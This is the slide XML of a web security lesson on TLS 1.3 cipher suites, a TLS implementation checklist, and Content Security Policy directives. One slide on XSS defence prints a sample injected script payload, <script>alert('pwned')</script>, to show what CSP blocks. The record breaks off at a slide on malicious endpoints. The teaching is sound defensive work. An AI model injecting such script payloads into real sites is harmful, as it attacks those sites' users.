              </a:rPr>
              <a:t> in cipher suites</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>No TLS-level compression</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>No renegotiation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>No export-strength ciphers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="224256041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F20F8-B5DA-AC3B-9628-18082F324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657BD-475E-A798-74B0-E7332E8DBCC6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>TLS 1.3 cipher suites</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0AFE04B-EF8A-172C-6C76-1A58B8C0EE97}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7899114" cy="3691691"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>TLS_AES_128_GCM_SHA256</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (Minimum)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>TLS_AES_256_GCM_SHA384</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>TLS_CHACHA20_POLY1305_SHA256</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="187616167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0E5C-8E54-DFA5-095E-B68C87191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02BFD-194A-F7EB-9A66-F0DC326110CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>TLS implementation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7CF0A4E6-699E-2CED-3B1D-6D19D459F111}"/>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dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Basic Implementation Checklist:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>TLS 1.3 as default</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Allow TLS 1.2 for communications with legacy systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Disable all deprecated 1.2 cipher suites</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Disable TLS 1.0 and 1.1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>SSL is the 'Hamlet' of HTTP security – we do not speak of it</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8047220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DAB1-FAD3-D188-9824-55467CC50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44F6A-EE86-35CD-5C30-DA8D324BB7D4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1313597"/>
            <a:ext cx="10515600" cy="4237977"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Lesson 03 –</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:latin typeface="Aptos Display"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t> HTTPS &amp; TLS </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="Cambria"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Topic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 02 –</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Aptos Display"/>
                <a:ea typeface="Cambria"/>
              </a:rPr>
              <a:t> CSP &amp; HSTS: Overview and Implementation Practices</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Cambria"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="262331494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9AF7-B9A4-305A-7F73-3711AB938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2D57B-1856-C351-C641-FD44CFE1528B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CSP Overview</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6A5CFD56-9E08-A7E1-59A3-03F8D1EE2F80}"/>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b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>CSP (Content Security Policy)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is a security standard that lets you tell the browser </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>what sources of content are allowed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> on your site.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33089553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7FD12-0B2C-2C59-618F-34B6F5E16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8A1B-DD34-9105-53C8-23BFED9DE16B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CSP Functionality</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8612E6B3-B6E8-96BD-1118-47C3FF1C9B85}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7899114" cy="4311923"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>CSP is configured as an HTTP response header that specifies a 'white list' of trusted sources , e.g.:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>script-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" err="1">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> – JavaScript</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>style-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" err="1">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> – CSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" err="1">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>img-src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> – Images</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>font-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" err="1">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> – Fonts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>connect-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" err="1">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> – XHR/fetch/WebSocket endpoints</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>media-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" err="1">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> – Audio/video</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>frame-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" err="1">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>iframes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>…and more</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="217578043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01342-2EB0-7742-282B-503A2732E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052CF-B63A-1882-1F91-ADD1061221A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CSP defenses - XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EC436211-CCEF-53F7-5E91-29F916DDEF79}"/>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dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Let's say an attacker discovers an XSS injection point in your application and injects:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>&lt;script&gt;alert('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>pwned</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>')&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Without CSP:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> the browser will run it</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>With CSP:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> If your </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>script-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> only allows scripts from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>example</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, then the browser </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>blocks inline scripts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> and external scripts from other domains</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10049515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1760D-9E26-572C-E5F2-65A8D4090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B5BD2-493F-75D7-95EC-575E2A7020DF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CSP Defenses – Malicious Endpoints</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
